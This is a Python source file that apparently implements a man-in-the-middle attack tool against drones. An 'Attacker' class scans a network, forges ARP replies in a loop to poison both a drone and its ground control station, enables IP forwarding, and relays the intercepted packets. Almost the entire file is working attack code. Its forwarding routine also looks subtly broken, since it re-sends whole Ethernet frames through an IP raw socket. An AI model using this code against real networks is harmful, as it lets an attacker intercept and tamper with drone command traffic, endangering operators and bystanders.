import os
import socket
import struct
import time
from .scanning_script import scan_range

BUFFER_SIZE = 1024


class Attacker:
    def __init__(self, network_interface):
        self.network_interface = network_interface
        self.attacker = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        self.attacker.bind((network_interface, 0))
        self.active_hosts = []
        self.packet_forwarder = True

    def start_scan(self, start_ip, end_ip):
        self.active_hosts = scan_range(self.network_interface, start_ip, end_ip)
        return self.active_hosts

    @staticmethod
    def create_ethernet_packet(target_mac, attacker_mac):
        dest_mac = bytes.fromhex(target_mac.replace(":", ""))
        src_mac = bytes.fromhex(attacker_mac.replace(":", ""))
        ether_type = 0x0806  # ARP Protocol

        ethernet_frame = struct.pack(
            '!6s6sH',
            dest_mac,
            src_mac,
            ether_type,
        )
        return ethernet_frame

    @staticmethod
    def create_arp_packet(sender_mac, sender_ip, target_mac, target_ip, response):
        victim_mac = bytes.fromhex(target_mac.replace(":", ""))
        attacker_mac = bytes.fromhex(sender_mac.replace(":", ""))
        victim_ip = socket.inet_aton(target_ip)
        attacker_ip = socket.inet_aton(sender_ip)

        hardware_type = 1
        protocol_type = 0x0800
        hardware_size = 6
        protocol_size = 4
        opcode = response

        arp_frame = struct.pack(
            '!HHBBH6s4s6s4s',
            hardware_type,
            protocol_type,
            hardware_size,
            protocol_size,
            opcode,
            attacker_mac,
            attacker_ip,
            victim_mac,
            victim_ip,
        )
        return arp_frame

    def send_arp_poison(self, attacker_mac, gateway_ip, target_mac, target_ip):
        opcode = 2
        arp_reply = self.create_arp_packet(attacker_mac, gateway_ip, target_mac, target_ip, opcode)
        ethernet_frame = self.create_ethernet_packet(target_mac, attacker_mac)
        arp_spoof_packer = ethernet_frame + arp_reply
        self.attacker.send(arp_spoof_packer)

    def start_arp_spoof(self, attacker_mac=None, drone_ip=None, drone_mac=None, gcs_ip=None, gcs_mac=None):
        try:
            while True:
                # Target Spoof GCS
                # gcs_arp = sender_mac, drone_ip, gcs_mac, gcs_ip
                self.send_arp_poison(attacker_mac, drone_ip, gcs_mac, gcs_ip)
                print("sent arp poison to gcs")
                # Target Drone
                # drone_arp = sender_mac, gcs_ip, drone_mac, drone_ip
                self.send_arp_poison(attacker_mac, gcs_ip, drone_mac, drone_ip)
                print("sent arp poison to drone")
                time.sleep(2)
        except KeyboardInterrupt:
            print("Keyboard interrupt received, Stopping ARP spoofing, exiting...")

    def start_packet_forwarder(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.bind((self.network_interface, 0))
        try:
            print("Packet forwarding started")

            while self.packet_forwarder:
                packet, addr = sock.recvfrom(65535)
                self.forward_packet(packet)
        except Exception as e:
            print(e)
            self.packet_forwarder = False
        finally:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("Packet forwarding stopped")
            self.packet_forwarder = False
            sock.close()

    @staticmethod
    def forward_packet(packet):
        try:
            socket_forwarder = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            socket_forwarder.sendto(packet, (socket.inet_ntoa(packet[30:34]), 0))
            print(f"packet forwarded to: IP: {socket.inet_ntoa(packet[30:34])}")
            socket_forwarder.close()
        except Exception as e:
            print(e)
